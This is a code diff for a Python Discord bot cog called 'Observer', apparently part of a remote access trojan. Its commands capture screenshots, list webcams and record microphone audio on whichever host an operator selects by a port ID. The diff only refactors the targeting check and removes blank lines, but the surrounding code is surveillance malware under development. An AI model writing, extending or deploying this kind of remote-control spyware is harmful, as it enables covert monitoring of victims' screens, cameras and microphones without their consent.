@@ -22,25 +22,21 @@ class Observer(commands.Cog):
         if not getattr(self.bot, 'is_selected', False):
             return
         
-        should_run = False
-        target_id = None
+        should_reply = False
+
         if arg is None:
-            pass
-        else:
-            target_id = arg
-
-        if target_id is None:
-            should_run = True
-        elif target_id == my_id:
-            should_run = True
-
-        if not should_run:
-            return    
+            should_reply = True
+        elif arg == my_id:
+            should_reply = True
+        
+        if not should_reply:
+            return
 
         await self.process_screenshot(ctx)
 
     async def process_screenshot(self, ctx):
         my_id = getattr(self.bot, 'port_id', 'Unknown')
+        
         async with ctx.typing():
             try:
                 def capture_screens():
@@ -110,7 +106,6 @@ class Observer(commands.Cog):
     # TODO: Fix Camera index out Issue
     @commands.command(name="camlist", aliases=["cams"])
     async def list_webcams(self, ctx, arg1: str = None, num: int = 1):    
-
         my_id = getattr(self.bot, 'port_id', 'Unknown')  
 
         if not getattr(self.bot, 'is_selected', False):
@@ -262,7 +257,6 @@ class Observer(commands.Cog):
 
     @commands.command(name="listen", aliases=["mic", "audio"])
     async def record_audio(self, ctx, arg: str = None, seconds: int = 10):
-
         my_id = getattr(self.bot, 'port_id', 'Unknown')  
 
         if not getattr(self.bot, 'is_selected', False):
